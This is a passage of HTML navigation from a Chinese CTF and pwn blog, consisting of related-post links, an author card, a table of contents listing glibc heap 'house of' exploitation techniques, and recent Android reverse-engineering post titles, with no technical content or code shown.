class="title">2024-1-26沙盒的学习</div></div></a></div><div><a href="/2024/08/07/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97pwn/" title="2024ciscn华东南pwn"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-07</div><div class="title">2024ciscn华东南pwn</div></div></a></div><div><a href="/2024/02/01/2024-1-31-pwnable-bookwriter/" title="2024-1-31 pwnable_bookwriter"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-01</div><div class="title">2024-1-31 pwnable_bookwriter</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">s1nec-1o</div><div class="author-info__description">万事胜意</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="http://github.com/s1nec-1o"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">正在学习iot pwn 欢迎广大师傅与我交流</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of%E6%89%8B%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">house of手法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-einherjar"><span class="toc-number">1.2.</span> <span class="toc-text">house of einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4"><span class="toc-number">1.2.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7"><span class="toc-number">1.2.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-muney"><span class="toc-number">1.3.</span> <span class="toc-text">House of muney</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.1.</span> <span class="toc-text">利用版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-spirit"><span class="toc-number">1.4.</span> <span class="toc-text">house of spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-1"><span class="toc-number">1.4.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.4.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-1"><span class="toc-number">1.4.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-1"><span class="toc-number">1.4.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-force"><span class="toc-number">1.5.</span> <span class="toc-text">house of force</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-2"><span class="toc-number">1.5.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.5.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-2"><span class="toc-number">1.5.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-2"><span class="toc-number">1.5.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-lore"><span class="toc-number">1.6.</span> <span class="toc-text">house of lore</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-3"><span class="toc-number">1.6.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-3"><span class="toc-number">1.6.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.6.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-3"><span class="toc-number">1.6.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-3"><span class="toc-number">1.6.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-orange"><span class="toc-number">1.7.</span> <span class="toc-text">house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-4"><span class="toc-number">1.7.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-4"><span class="toc-number">1.7.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-4"><span class="toc-number">1.7.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-4"><span class="toc-number">1.7.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-4"><span class="toc-number">1.7.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-rabbit"><span class="toc-number">1.8.</span> <span class="toc-text">house of rabbit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-5"><span class="toc-number">1.8.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-5"><span class="toc-number">1.8.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-5"><span class="toc-number">1.8.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-5"><span class="toc-number">1.8.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-5"><span class="toc-number">1.8.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-roman"><span class="toc-number">1.9.</span> <span class="toc-text">house of roman</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-6"><span class="toc-number">1.9.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-6"><span class="toc-number">1.9.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-6"><span class="toc-number">1.9.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-6"><span class="toc-number">1.9.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-6"><span class="toc-number">1.9.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-storm"><span class="toc-number">1.10.</span> <span class="toc-text">house of storm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-7"><span class="toc-number">1.10.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-7"><span class="toc-number">1.10.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-7"><span class="toc-number">1.10.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-7"><span class="toc-number">1.10.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-7"><span class="toc-number">1.10.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-corrosion"><span class="toc-number">1.11.</span> <span class="toc-text">house of corrosion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-8"><span class="toc-number">1.11.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-8"><span class="toc-number">1.11.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-8"><span class="toc-number">1.11.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-8"><span class="toc-number">1.11.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-8"><span class="toc-number">1.11.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-husk"><span class="toc-number">1.12.</span> <span class="toc-text">house of husk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-9"><span class="toc-number">1.12.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-9"><span class="toc-number">1.12.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-9"><span class="toc-number">1.12.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-9"><span class="toc-number">1.12.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-9"><span class="toc-number">1.12.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-kauri"><span class="toc-number">1.13.</span> <span class="toc-text">house of kauri</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-10"><span class="toc-number">1.13.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-10"><span class="toc-number">1.13.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-10"><span class="toc-number">1.13.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-10"><span class="toc-number">1.13.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-10"><span class="toc-number">1.13.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-mind"><span class="toc-number">1.14.</span> <span class="toc-text">house of mind</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-11"><span class="toc-number">1.14.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-11"><span class="toc-number">1.14.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-11"><span class="toc-number">1.14.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-11"><span class="toc-number">1.14.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-11"><span class="toc-number">1.14.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-botcake"><span class="toc-number">1.15.</span> <span class="toc-text">house of botcake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-12"><span class="toc-number">1.15.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-12"><span class="toc-number">1.15.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-12"><span class="toc-number">1.15.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-12"><span class="toc-number">1.15.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-12"><span class="toc-number">1.15.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-rust"><span class="toc-number">1.16.</span> <span class="toc-text">house of rust</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-13"><span class="toc-number">1.16.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-13"><span class="toc-number">1.16.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-13"><span class="toc-number">1.16.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-13"><span class="toc-number">1.16.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-13"><span class="toc-number">1.16.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-crust"><span class="toc-number">1.17.</span> <span class="toc-text">house of crust</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-14"><span class="toc-number">1.17.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-14"><span class="toc-number">1.17.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-14"><span class="toc-number">1.17.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-14"><span class="toc-number">1.17.4.</span> <span class="toc-text">相关技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-io"><span class="toc-number">1.18.</span> <span class="toc-text">house of io</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-15"><span class="toc-number">1.18.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-15"><span class="toc-number">1.18.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-15"><span class="toc-number">1.18.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-15"><span class="toc-number">1.18.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-14"><span class="toc-number">1.18.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-banana"><span class="toc-number">1.19.</span> <span class="toc-text">house of banana</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-16"><span class="toc-number">1.19.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-16"><span class="toc-number">1.19.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-16"><span class="toc-number">1.19.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-16"><span class="toc-number">1.19.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-15"><span class="toc-number">1.19.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-kiwi"><span class="toc-number">1.20.</span> <span class="toc-text">house of kiwi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-17"><span class="toc-number">1.20.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-17"><span class="toc-number">1.20.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-17"><span class="toc-number">1.20.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-16"><span class="toc-number">1.20.4.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-emma"><span class="toc-number">1.21.</span> <span class="toc-text">house of emma</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-18"><span class="toc-number">1.21.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-18"><span class="toc-number">1.21.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-18"><span class="toc-number">1.21.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-17"><span class="toc-number">1.21.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-17"><span class="toc-number">1.21.5.</span> <span class="toc-text">利用效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.21.6.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-pig"><span class="toc-number">1.22.</span> <span class="toc-text">house of pig</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-19"><span class="toc-number">1.22.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-19"><span class="toc-number">1.22.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-19"><span class="toc-number">1.22.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-18"><span class="toc-number">1.22.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-18"><span class="toc-number">1.22.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-obstack"><span class="toc-number">1.23.</span> <span class="toc-text">house of obstack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-20"><span class="toc-number">1.23.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-20"><span class="toc-number">1.23.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-20"><span class="toc-number">1.23.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-19"><span class="toc-number">1.23.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-19"><span class="toc-number">1.23.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-apple2"><span class="toc-number">1.24.</span> <span class="toc-text">house of apple2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-21"><span class="toc-number">1.24.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-21"><span class="toc-number">1.24.2.</span> <span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-21"><span class="toc-number">1.24.3.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%8A%80%E5%B7%A7-20"><span class="toc-number">1.24.4.</span> <span class="toc-text">相关技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C-20"><span class="toc-number">1.24.5.</span> <span class="toc-text">利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.25.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/18/Android%E8%AE%BE%E5%A4%87%E6%8C%87%E7%BA%B9%E9%87%87%E9%9B%86%E5%AE%9E%E8%B7%B5/" title="Android设备指纹采集实践">Android设备指纹采集实践</a><time datetime="2025-11-18T08:32:20.000Z" title="发表于 2025-11-18 16:32:20">2025-11-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/03/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E4%B9%8BAntiFakerAndroidChecker/" title="Android逆向从入门到入土之AntiFakerAndroidChecker(3)">Android逆向从入门到入土之AntiFakerAndroidChecker(3)</a><time datetime="2025-11-03T13:26:59.000Z" title="发表于 2025-11-03 21:26:59">2025-11-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/21/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E4%B9%8B%E5%88%9D%E8%AF%86%E9%A3%8E%E6%8E%A7-2/" title="Android逆向从入门到入土之初识风控(2)">Android逆向从入门到入土之初识风控(2)</a><time datetime="2025-10-21T14:17:54.000Z" title="发表于 2025-10-21 22:17:54">2025-10-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/11/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-1/" 